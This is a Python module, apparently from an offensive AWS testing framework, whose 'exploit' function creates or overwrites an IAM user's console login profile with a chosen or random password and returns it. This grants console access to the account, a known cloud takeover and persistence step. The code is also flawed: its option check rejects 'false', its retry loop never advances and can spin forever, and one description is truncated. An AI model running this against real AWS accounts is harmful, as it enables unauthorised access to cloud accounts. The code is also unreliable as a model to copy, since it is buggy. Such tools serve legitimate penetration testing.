import random, string

author = {
    "name":"gl4ssesbo1",
    "twitter":"https://twitter.com/gl4ssesbo1",
    "github":"https://github.com/gl4ssesbo1",
    "blog":"https://www.pepperclipp.com/"
}

needs_creds = True

variables = {
    "SERVICE": {
        "value": "iam",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    },
    "USERNAME": {
        "value": "",
        "required": "true",
        "description": "The user to allow access to the Management Console. Either use this ot"
    },
    "PASSWORD": {
        "value": "",
        "required": "false",
        "description": "The password to give to the user. The password needs to be compatible with the password policy configured. Use enum/aws_iam_get_account_password_policy to check it."
    },
    "UPDATE-LOGIN-PROFILE": {
        "value": "false",
        "required": "true",
        "description": "If set to true, if user already has a login profile, the module will try to update the login profile of the user."
    },
}
description = "If an IAM user is not allowed to access the Management Console, you can allow it using a password you want."

aws_command = "aws iam create-login-profile --user-name <user> --password <password> <--password-reset-required OR --no-password-reset-required> --region <region> --profile <profile>"


def exploit(profile, workspace):
    username = variables['USERNAME']['value']
    password = variables['PASSWORD']['value']
    providedpassword = variables['PASSWORD']['value']
    updatePassword = variables['UPDATE-LOGIN-PROFILE']['value']

    if updatePassword != "true" and updatePassword != "true":
        return {"error": "UPDATE-LOGIN-PROFILE should be either True or False"}

    if password == "":
        password = ''.join([random.choice(string.ascii_letters + string.digits + string.punctuation) for n in range(12)])

    check = 0
    errormessage = ""
    while True:
        if check == 5:
            return {"error": errormessage}

        try:
            response = profile.create_login_profile(
                UserName=username,
                Password=password,
                PasswordResetRequired=True
            )

            json_data = response['LoginProfile']
            json_data['Password'] = password
            return json_data

        except profile.exceptions.EntityAlreadyExistsException:
            if updatePassword.lower() == "true":
                response = profile.update_login_profile(
                    UserName=username,
                    Password=password,
                    PasswordResetRequired=True
                )

                json_data = response['LoginProfile']
                json_data['Password'] = password
                return json_data

        except profile.exceptions.NoSuchEntityException:
            return {"error": "This user does not exist."}

        except profile.exceptions.PasswordPolicyViolationException:
            if providedpassword != "":
                return {"error": "The password does not comply with the password policy."}
            else:
                errormessage = "The password does not comply with the password policy."

        except Exception as e:
            return {"error": f"Error Creating Login Profile: {str(e)}"}

